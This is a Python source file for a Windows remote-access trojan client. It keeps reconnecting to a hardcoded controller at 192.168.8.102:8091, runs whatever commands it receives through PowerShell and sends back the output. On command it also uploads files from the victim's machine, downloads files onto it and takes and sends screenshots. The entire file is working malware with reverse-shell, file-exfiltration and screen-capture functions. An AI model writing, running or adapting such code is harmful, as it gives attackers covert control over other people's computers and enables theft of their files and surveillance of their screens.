import socket
import subprocess
import time
import os
import pyautogui
from datetime import datetime


def main():
    # initial config
    eof = "<end_of_file>"
    end_result = "<end_of_result>"
    chunk_size = 2048
    server_address = ("192.168.8.102", 8091)

    while True:
        try:
            # create a client
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            print("connecting to server...", server_address)

            # trying to connect with the server
            client_socket.connect(server_address)

            while True:
                # receive a command from server
                command = client_socket.recv(1024).decode()

                # change path
                if command.startswith("cd") or len(command) == 2 and command[0].isalpha() and command[1] == ":":
                    change_path(command)
                    continue

                elif command.startswith("download "):
                    file_name = command.split(' ', 1)[1]

                    # check if file is exist to send it to server
                    if os.path.exists(file_name):
                        exists = "yes"
                        client_socket.send(exists.encode())
                        send_file(file_name, client_socket, eof, chunk_size)
                    continue

                elif command.startswith("upload"):
                    exists = client_socket.recv(1024)

                    if exists.decode() == "yes":
                        answer = "yes"
                        client_socket.send(answer.encode())
                        file_name = command.split(' ', 1)[1]

                        save_file(file_name, client_socket, eof, chunk_size)

                    continue

                elif command == "screenshot":

                    screenshot = take_screenshot()

                    client_socket.send(screenshot.encode())

                    if os.path.exists(screenshot):
                        exists = "yes"
                        client_socket.send(exists.encode())
                        answer = client_socket.recv(1024)
                        if answer.decode() == "yes":
                            send_file(screenshot, client_socket, eof, chunk_size)

                            print("File sent successfully")
                            os.remove(screenshot)
                        continue

                elif command == "":
                    continue

                else:
                    execute_command(client_socket, command, end_result)


        except Exception:
            print("can't connect to server")
            time.sleep(3)


def change_path(command):
    path = command.split(' ', 1)[1] if command.startswith("cd") else command
    if os.path.exists(path):
        os.chdir(path)


def send_file(file_name, client_socket, eof, chunk_size):
    with open(file_name, "rb") as file:
        chunk = file.read(chunk_size)
        while len(chunk) > 0:
            client_socket.send(chunk)
            chunk = file.read(2048)
        client_socket.send(eof.encode())
    print("File sent successfully")


def save_file(file_name, client_socket, eof, chunk_size):
    with open(file_name, "wb") as download_file:
        print("Downloading file")
        while True:
            chunk = client_socket.recv(chunk_size)
            if chunk.endswith(eof.encode()):
                chunk = chunk[:-len(eof)]
                download_file.write(chunk)
                break
            download_file.write(chunk)
    print("File Downloaded successfully")


def take_screenshot():
    now = datetime.now()
    # unique name
    now = now.strftime("%m-%d-%Y-%H.%M.%S")
    print("Take Screenshot")
    screen = pyautogui.screenshot()
    screen.save("" + now + '.png')
    print("Screenshot Saved")
    screenshot = now + '.png'
    return screenshot


def execute_command(client_socket, command, end_result):
    output = subprocess.run(["powershell.exe", command], shell=True, capture_output=True,
                            stdin=subprocess.DEVNULL)
    if output.stderr.decode("utf-8") == "":
        result = output.stdout
        result = result.decode("utf-8") + end_result
        result = result.encode("utf-8")
    elif output.stderr.decode("utf-8") != "":
        result = output.stderr
        result = result.decode("utf-8") + end_result
        result = result.encode("utf-8")
    client_socket.sendall(result)


if __name__ == "__main__":
    main()
